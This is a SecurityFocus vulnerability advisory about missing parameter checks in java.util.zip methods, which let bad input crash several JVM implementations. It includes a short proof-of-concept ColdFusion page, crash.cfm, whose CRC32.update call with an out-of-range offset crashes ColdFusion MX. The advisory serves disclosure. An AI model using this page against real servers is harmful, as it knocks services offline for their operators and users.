source: http://www.securityfocus.com/bid/7109/info

Several implementations of the Java Virtual Machine have been reported to be prone to a denial of service condition. This vulnerability occurs in several methods in the java.util.zip class. 

The methods can be called with certain types of parameters however, there does not appear to be proper checks to see whether the parameters are NULL values. When these native methods are called with NULL values, this will cause the JVM to reach an undefined state which will cause it to behave in an unpredictable manner and possibly crash.

The following cfm will cause Macromedia ColdFusin MX to fail:

- ------------------crash.cfm-------------------------
<!H1> Coldfusion MX crash with Java <!/h1>
<!h2> Marc Schoenefeld @ illegalaccess.org <!/h2>

<!cfapplication name="Marc" sessionmanagement="yes">


<!cfobject action="create" type="Java" class="java.lang.String" name="s">
<!cfobject action="create" type="Java" class="java.util.zip.CRC32" name="c">
<!cfset ret=s.init()>
<!cfset ret=c.init()>
<!cfset str = s.getBytes()>
<!cfset retval = c.update(str,2147483647,4)>
- ------------------crash.cfm-------------------------